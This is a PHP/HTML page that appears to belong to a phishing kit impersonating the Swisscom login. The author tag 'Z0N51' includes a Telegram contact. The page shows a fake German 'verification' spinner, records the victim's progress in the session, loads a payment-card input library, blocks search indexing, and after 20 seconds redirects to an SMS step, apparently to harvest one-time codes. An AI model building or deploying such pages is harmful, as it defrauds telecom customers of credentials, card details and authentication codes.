<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'loading1';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Swisscom Login</title>
    </head>

    <body style="display: flex; flex-direction: column;">

        <div id="wrapper" class="flex-grow-1">
            <div class="login-area" style="width: 375px;">
                <div class="right w-100">
                    <div class="verify">
                        <h3>Überprüfung</h3>
                        <div class="spinner-border" role="status"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- FOOTER -->
        <footer id="footer" class="d-lg-block d-md-block d-sm-none d-none">
            <div class="container">
                <div class="left">
                    <img src="../assets/imgs/logo2.png">
                </div>
                <div class="right">
                    <p>Über Swisscom Login</p>
                    <div class="lang">
                        <div class="inner">
                            <span class="mm">EN</span> <span class="sym"></span>
                        </div>
                        <ul>
                            <li>DE</li>
                            <li class="active">EN</li>
                            <li>FR</li>
                            <li>IT</li>
                        </ul>
                    </div>
                </div>
            </div>
        </footer>
        <!-- END FOOTER -->

        <footer id="footer2" class="d-lg-none d-md-none d-sm-flex d-flex">
            <p class="flex-grow-1">Über Swisscom Login</p>
            <p>DE <span></span> FR <span></span> IT</p>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            setTimeout(function () {
                window.location.href= '../index.php?redirection=sms';
            },20000); // 1000 = 1s
        </script>

    </body>

</html>